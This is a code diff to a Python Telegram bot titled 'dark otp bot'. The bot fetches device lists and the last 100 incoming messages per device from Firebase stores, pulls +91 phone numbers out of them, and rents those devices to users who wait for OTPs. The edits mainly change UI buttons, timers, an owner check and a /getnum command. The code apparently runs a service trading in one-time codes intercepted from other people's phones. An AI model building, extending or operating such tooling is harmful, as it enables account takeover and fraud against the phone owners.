@@ -1,6 +1,6 @@
 from aiogram import Router, F
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, CopyTextButton
-from aiogram.filters import CommandStart
+from aiogram.filters import CommandStart, Command
 from aiogram.fsm.context import FSMContext
 import random, time, asyncio
 import database as db
@@ -8,6 +8,7 @@ import firebase_utils as fbu
 from utils.ui import sc, btn
 from utils.helper import clear_user_lease, get_countries, get_servers_grouped, is_owner
 from states import S
+import config
 
 user_router = Router()
 
@@ -26,13 +27,23 @@ async def cmd_start(msg: Message):
         d["users"][str(uid)] = {"name": msg.from_user.full_name, "joined": int(time.time()), "otp_history": [], "saved_numbers": {}}
         db.save_data(d)
 
-    # 🔥 OWNER CHECK FIXED
-    if is_owner(uid):
+    # 🔥 HARDCODED OWNER CHECK
+    if uid == config.MAIN_OWNER or is_owner(uid):
         from handlers.admin import admin_home_msg
         await admin_home_msg(msg)
         return
 
     await msg.answer(f"👋 <b>{sc('welcome to dark otp bot')}</b>\n{sc('select an option below')}:", reply_markup=main_kb(), parse_mode="HTML")
+
+@user_router.message(Command("getnum"))
+async def cmd_getnum(msg: Message):
+    class FakeCq:
+        from_user = msg.from_user
+        message = msg
+        data = "user:get_num"
+        async def answer(self, text, **kwargs): pass
+        async def edit_text(self, text, **kwargs): await msg.answer(text, **kwargs)
+    await user_get_num(FakeCq())
 
 @user_router.callback_query(F.data == "user:home")
 async def user_home(cq: CallbackQuery):
@@ -82,7 +93,6 @@ async def user_server(cq: CallbackQuery):
     used = d.setdefault("used_devices", {}).setdefault(str(uid), {})
     now = int(time.time())
     
-    # PARALLEL FETCHING
     async def fetch_clients_data(fb):
         clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
         return fb, clients
@@ -113,7 +123,6 @@ async def user_server(cq: CallbackQuery):
     data = db.load_data()
     data["used_devices"][str(uid)] = used
     
-    # FETCH LAST 100 MESSAGES FOR EXTRACTION
     msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=100", fb.get("auth"))
     msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
     last_id = int(msgs[0].get("id", 0)) if msgs else 0
@@ -134,7 +143,8 @@ async def user_server(cq: CallbackQuery):
     if best_nums:
         for n, c in best_nums:
             nums_text += f"📞 <code>+91{n}</code> | Conf: <b>{c}%</b>\n"
-            kb_nums.append([InlineKeyboardButton(text=f"📋 Copy +91{n}", copy_text=CopyTextButton(text=f"+91{n}"))])
+            # 🔥 EMOJI REMOVED FROM COPY BUTTON
+            kb_nums.append([InlineKeyboardButton(text=f"Copy +91{n}", copy_text=CopyTextButton(text=f"+91{n}"))])
     else:
         nums_text = f"⚠️ <b>{sc('no numbers found. waiting for otp...')}</b>"
         
@@ -148,12 +158,11 @@ async def user_server(cq: CallbackQuery):
         f"🆔 {sc('rent id')}: <code>{dev_id}</code>{rep_mark}\n"
         f"⚙️ {sc('code')}: <code>{battery}T</code>\n"
         f"❤️ {sc('health')}: <b>10/10</b>\n\n"
-        f"{nums_text}\n"
-        f"⌛ <i>{sc('waiting for otp...')}</i>"
+        f"{nums_text}"
     )
     
+    # 🔥 COPY RENT ID BUTTON REMOVED
     kb = kb_nums + [
-        [InlineKeyboardButton(text="📋 Copy Rent ID", copy_text=CopyTextButton(text=dev_id))],
         [btn("info", f"user:info:{dev_id}", "ℹ️"), btn("save number", f"user:save:{dev_id}", "⭐")],
         [btn("next number", f"user:server:{country}:{idx}", "🔄"), btn("stop", "user:stop", "⏹")],
         [btn("back", f"user:country:{country}", "🔙")]
@@ -221,8 +230,14 @@ async def user_access(cq: CallbackQuery):
     }
     db.save_data(d)
     
-    text = f"📱 <b>{sc('re-accessed device')}</b>\n🆔 {sc('rent id')}: <code>{info['dev_id']}</code>\n📞 {sc('number')}: <code>+91{key}</code>\n\n⌛ <i>{sc('waiting for otp...')}</i>"
-    kb = [[InlineKeyboardButton(text="📋 Copy Rent ID", copy_text=CopyTextButton(text=info['dev_id']))], [btn("stop", "user:stop", "⏹")], [btn("main menu", "user:home", "🏠")]]
+    # 🔥 TIMER REMOVED
+    text = f"📱 <b>{sc('re-accessed device')}</b>\n🆔 {sc('rent id')}: <code>{info['dev_id']}</code>\n📞 {sc('number')}: <code>+91{key}</code>"
+    
+    # 🔥 COPY RENT ID BUTTON REMOVED
+    kb = [
+        [btn("stop", "user:stop", "⏹")], 
+        [btn("main menu", "user:home", "🏠")]
+    ]
     await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
 
 @user_router.callback_query(F.data == "user:stop")
